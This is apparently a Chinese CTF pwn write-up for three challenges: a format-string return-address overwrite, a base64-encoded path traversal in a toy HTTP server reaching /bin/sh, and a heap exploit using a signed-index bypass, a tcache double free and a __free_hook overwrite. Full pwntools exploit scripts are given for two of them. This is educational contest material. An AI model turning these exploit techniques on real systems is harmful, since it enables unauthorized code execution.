# pwn-problems_WP

总结一下最近做的pwn题。有些还挺有意思的。本文同步于周报repo && 个人博客。喜欢的话点个star或收藏博客。


### HWS2023_fmt

最近的比赛都非常的喜欢出格式化字符串。栈上的，非栈上的，堆上的。通过这几次比赛的折磨之后，我也发现了格式化字符串类型的题目还是要掌握其本质。不可以一味地依赖于自动化工具。最近这几次比赛中，自动化工具基本是无用的。只有了解了原理，才能自己手写出一份好用的exploit。

首先阅读程序源码，很简单粗暴的两个格式化字符串利用点：

![image-20230724165802240](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/07/1690189091.png)

可以想到一个用来泄露libc地址和栈地址，为我们修改主函数的return address为one_gadget做准备，而第二个就直接写入格式化字符串来修改ret_addr。需要注意的是，这里分三次写入，一次修改两个字节。而这三次写入的字节在数字上需要满足递增关系，因此需要多尝试几次。

效果图：

![image-20230724172110143](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/07/1690190500.png)

EXP如下：

```python
from pwn import *
import sys
remote_addr = ["123.60.179.52",30207]
libc = ELF('./libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./fmt_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('''
    b *$rebase(0x13aa)
''')
payload = b'%8$p.%18$p'
sla(b'str: ', payload)
libc.address = int(rc(14), 16) - 0x1e94a0
ru(b'.')
ret_addr = int(rc(14), 16) - 8
one = libc.address + 0xe3b01
pr('libc.address', libc.address)
pr('one', one)
d1 = ((one >> 32) & 0xffff) - ((one >> 16) & 0xffff)
d2 = (one & 0xffff) - ((one >> 32) & 0xffff)

payload = b"%" + str((one >> 16) & 0xffff).encode() + b"c%11$hn" 
payload += b"%" + str(d1).encode() + b"c%12$hn" 
payload += b"%" + str(d2).encode() + b"c%13$hn" 
payload = payload.ljust(0x28, b'a')
payload += p64(ret_addr + 2)
payload += p64(ret_addr + 4)
payload += p64(ret_addr)

#payload = fmtstr_payload(6, {ret_addr:10})
sla("str: ", payload)

shell()
```

### HWS2023_ezhttpd

程序模拟了一个http的服务端。这里本地调试的话需要在当前目录下建立一个htdocs的目录。然后调试的话需要两份脚本，一份用于服务端调试，一份用于做交互。

![image-20230730202017674](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/07/1690719626.png)

进入到start_routine函数里，函数较为复杂，但基本逻辑可以看出是用户向服务端发出GET或POST请求，服务器返回文件。在这里，目录中不可以有诸如..这样的符号，否则程序会直接返回一个200但无用的报文。

![image-20230730202715785](C:\Users\pc\AppData\Roaming\Typora\typora-user-images\image-20230730202715785.png)

用户发送的报文需满足格式，例如要有GET/POST以及Authorization字段。在满足条件后，程序将haystack里的字段进行拼接，并查找文件是否存在，如存在，进入sub_2993函数。

![image-20230730202950100](C:\Users\pc\AppData\Roaming\Typora\typora-user-images\image-20230730202950100.png)

在2993函数里有execl函数可以执行命令。我们只要想办法令传入的参数里有/bin/sh即可获取shell。

![image-20230730203042778](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/07/1690720683.png)

那么漏洞就在于，这里有一个base64的转换。我们将带有..字段的数据进行base64编码后，服务器会为我们解码。然后我们注意到v12和haystack是紧挨着的，意味着我们先输入40个padding字符占据v12后，含有../../../bin/sh的参数会进入haystack里。这里会对haystack是否存在诸如html，js的后缀进行检验，但是也可以加入问号来绕过后缀。总之，payload应该为cyclic(0x40) + base64.encode(../../../../../bin/sh?aaa.html)。

![image-20230730203514771](C:\Users\pc\AppData\Roaming\Typora\typora-user-images\image-20230730203514771.png)

最终效果：

![image-20230730203757761](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/07/1690720685.png)

EXP如下：

```python
from pwn import *
import sys
remote_addr = ["127.0.0.1", 4000]
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("")
    context(arch='', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)


```



### chall from Ve1kcon

战队师傅给的一道很有意思的堆题。

add里限制了堆块的大小，而且不是直接写入堆块，而是先创建一个0x10的小堆块，之后在小堆块里存储申请堆块的地址和大小。

![image-20230730213001293](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/07/1690723805.png)

主要漏洞出现在delete里，这里对整数的判断是有漏洞的。在判断大于0时，可以将高符号位设为1，判断时会认定该数字满足小于15的条件。而在判断小于0时，低字节又大于0。这样的绕过之后，可以实现任意地址的free。

![image-20230730213324973](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/07/1690788457.png)

又因为这里存在uaf漏洞，我们可以构造一个tcache里的double free，之后实现申请到free_hook并写入one_gadget。

![image-20230730220813240](https://raw.githubusercontents.com/BattiestStone4/imgs/master/2023/07/1690726094.png)

EXP如下：

```python
from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc-2.27.so')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./chall_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def menu(idx):
    sla(b'>', str(idx).encode())

def add(size):
    menu(1)
    sla(b'size: ', str(size).encode())

def delete(idx):
    menu(2)
    sla(b'idx: ', str(idx).encode())

def show(idx):
    menu(3)
    sla(b'idx: ', str(idx).encode())

def edit(idx, content):
    menu(4)
    sla(b'idx: ', str(idx).encode())
    sa(b'content: ', content)

debug('''
   b *$rebase(0xc73) 
   b *$rebase(0xbfb)
''')

for i in range(8):
    add(0x80)
for i in range(8):
    delete(7 - i)
for i in range(7):
    add(0x80)

add(0x10) 
show(7)

libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 160 - 64 - libc.sym['main_arena']
pr('libc.address', libc.address) #leak_libc

one = libc.address + 0x4f302
free_hook = libc.sym['__free_hook']

show(0)
heap_base = u64(rc(6).ljust(8, b'\x00')) - 0x470
pr('heap_base', heap_base) #leak_heap

edit(7, p64(heap_base + 0x3a0))
edit(1, p64(heap_base + 0x310)) #construct double free

idx = ((1 << 63) + 0x42) - (1 << 64)
delete(idx) #int overflow


add(0x10)
edit(8, p64(free_hook) + p64(8))
edit(0, p64(one)) #one
delete(1)


shell()

```

